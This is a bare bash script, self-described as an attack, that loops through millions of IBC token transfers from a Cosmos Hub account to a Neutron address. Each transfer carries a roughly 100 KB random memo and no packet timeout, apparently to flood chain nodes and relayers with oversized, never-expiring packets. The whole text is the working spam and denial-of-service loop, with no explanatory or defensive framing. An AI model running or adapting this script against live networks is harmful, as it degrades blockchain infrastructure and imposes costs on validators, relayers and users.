set -ue

SEQUENCE=$(curl http://127.0.0.1:1317/cosmos/auth/v1beta1/accounts/cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq | jq --raw-output ' .account.sequence ')


for i in $( eval echo {"$SEQUENCE"..10000000} )

do

	gaiad tx ibc-transfer transfer transfer channel-58 neutron1083svrca4t350mphfv9x45wq9asrs60cvs77fx 1uatom --from cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas 1109809 --yes --fees 2775uatom --sequence $i  --packet-timeout-timestamp 0 &> attack.log

cat attack.log

	if [ $(grep -c "mismatch" attack.log) -eq 1 ]
	then
		echo "sequence number mismatch"
		break
	fi

done

echo "if you're running it right the script just restarted"
